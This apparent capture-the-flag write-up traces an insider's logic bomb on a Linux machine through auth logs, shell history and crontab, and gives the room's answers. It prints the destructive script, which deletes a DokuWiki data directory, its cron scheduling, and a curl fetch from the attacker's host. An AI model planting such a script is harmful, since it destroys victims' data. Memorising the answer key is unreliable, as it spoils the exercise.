# Disgruntled
> use your linux forensic knowledge ( pre req: https://tryhackme.com/room/linuxforensics)


## Tasks

Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.

Answer the questions below
- The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

```bash
grep sudo /var/log/auth.log | grep install

# OUTPUT
Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; CO
MMAND=/usr/bin/apt install dokuwiki
Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; CO
MMAND=/usr/bin/apt install dokuwiki
Dec 28 06:20:55 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; CO
MMAND=/bin/chown www-data:www-data /usr/share/dokuwiki/VERSION /usr/share/dokuwiki/bin /usr/sh
are/dokuwiki/doku.php /usr/share/dokuwiki/feed.php /usr/share/dokuwiki/inc /usr/share/dokuwiki
/index.php /usr/share/dokuwiki/install.php /usr/share/dokuwiki/lib /usr/share/dokuwiki/vendor 
-R
```

- What was the present working directory (PWD) when the previous command was run?
```
/home/cybert
```

---

Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

Which user was created after the package from the previous task was installed?
```bash
grep sudo /var/log/auth.log | grep adduser 
# output
Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; CO
MMAND=/usr/sbin/adduser it-admin
```
Answer: it-admin


A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
```bash
root@ip-10-10-129-127:~# grep sudo /var/log/auth.log | grep visudo
# output
Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```
Answer: Dec 28 06:27:34

A script file was opened using the "vi" text editor. What is the name of this file?
```bash
grep sudo /var/log/auth.log | grep vi
# output
Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
Dec 28 07:14:27 ip-10-10-243-54 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/service sshd restart 
```
answer: bomb.sh

---

**Bomb has been Planted**

That bomb.sh file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

What is the command used that created the file bomb.sh?
```bash
# from the previous task we know it's it-admin
cat /home/it-admin/.bash_history
# output
whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
```
Answer format: curl 10.10.158.38:8080/bomb.sh --output bomb.sh

The file was renamed and moved to a different directory. What is the full path of this file now?
```bash
# we know attacker uses vi
cat /home/it-admin/.viminfo | grep saveas
# output
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
```
Answer format: /bin/os-update.sh


When was the file from the previous question last modified? (Format: Month Day HH:MM)
```bash
ls -la /bin | grep os-update
#output
-rw-r--r--  1 root root     325 Dec 28  2022 os-update.sh
```
Answer: Dec 28 06:29


What is the name of the file that will get created when the file from the first question executes?
```bash
root@ip-10-10-129-127:~# cat /bin/os-update.sh 
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" >
 /goodbye.txt
fi
```
---

**Following The Fuse**
So we have a file and a motive. The question we now have is: how will this file be executed?
Surely, he wants it to execute at some point?

```bash
root@ip-10-10-129-127:~# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow usercommand
17 ** * *root    cd / && run-parts --report /etc/cron.hourly
25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.da
ily )
47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.we
ekly )
52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.mo
nthly )
0 8* * *root/bin/os-update.sh
#
```

---

**Conclusion**

Thanks to you, we now have a good idea of what our disgruntled IT person was planning.

We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure.

Look at you, second day on the job, and you’ve already solved 2 cases for me. Tell Sophie I told you to give you a raise.


